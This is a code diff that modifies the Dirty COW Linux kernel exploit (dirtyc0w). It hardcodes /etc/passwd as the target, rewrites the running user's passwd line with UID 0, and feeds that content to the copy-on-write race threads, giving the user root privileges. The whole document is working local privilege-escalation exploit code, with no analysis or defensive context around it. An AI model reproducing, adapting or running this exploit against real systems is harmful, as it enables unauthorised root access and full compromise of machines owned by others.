@@ -24,6 +24,9 @@ m00000000000000000
 #include <sys/stat.h>
 #include <string.h>
 #include <stdint.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <pwd.h>
 
 void *map;
 int f;
@@ -73,20 +76,29 @@ You have to reset the file pointer to the memory position.
  
 int main(int argc,char *argv[])
 {
-/*
-You have to pass two arguments. File and Contents.
-*/
-  if (argc<3) {
-  (void)fprintf(stderr, "%s\n",
-      "usage: dirtyc0w target_file new_content");
-  return 1; }
   pthread_t pth1,pth2;
+  name=strdup("/etc/passwd");
+  f=open(name,O_RDONLY);
+  fstat(f,&st);
+  char* towrite=malloc(st.st_size+1);
+  read(f, towrite, st.st_size);
+  towrite[st.st_size]=0;
+  close(f);
+  char *attackline; char *exploitedline;
+  struct passwd *attacker=getpwuid(getuid());
+  asprintf(&attackline,"%s:%s:%d:%d:%s:%s:%s",attacker->pw_name,attacker->pw_passwd,attacker->pw_uid, attacker->pw_gid,attacker->pw_gecos,attacker->pw_dir,attacker->pw_shell);
+  asprintf(&exploitedline,"%s:%s:0:%d:%s:%s:%s",attacker->pw_name,attacker->pw_passwd, attacker->pw_gid,attacker->pw_gecos,attacker->pw_dir,attacker->pw_shell);
+  char *endoffile=strstr(towrite,attackline)+strlen(attackline);
+  char *changelocation=strstr(towrite,attackline);
+  int oldfilelen=strlen(towrite);
+  sprintf(changelocation,"%s%s",exploitedline,endoffile);
+  int linediff=strlen(attackline)-strlen(exploitedline);
+  int i; for(i=oldfilelen; i>oldfilelen-linediff; i--) towrite[i-1]='\n';
 /*
 You have to open the file in read only mode.
 */
-  f=open(argv[1],O_RDONLY);
+  f=open(name,O_RDONLY);
   fstat(f,&st);
-  name=argv[1];
 /*
 You have to use MAP_PRIVATE for copy-on-write mapping.
 > Create a private copy-on-write mapping.  Updates to the
@@ -103,8 +115,8 @@ You have to open with PROT_READ.
 /*
 You have to do it on two threads.
 */
-  pthread_create(&pth1,NULL,madviseThread,argv[1]);
-  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+  pthread_create(&pth1,NULL,madviseThread,name);
+  pthread_create(&pth2,NULL,procselfmemThread,towrite);
 /*
 You have to wait for the threads to finish.
 */
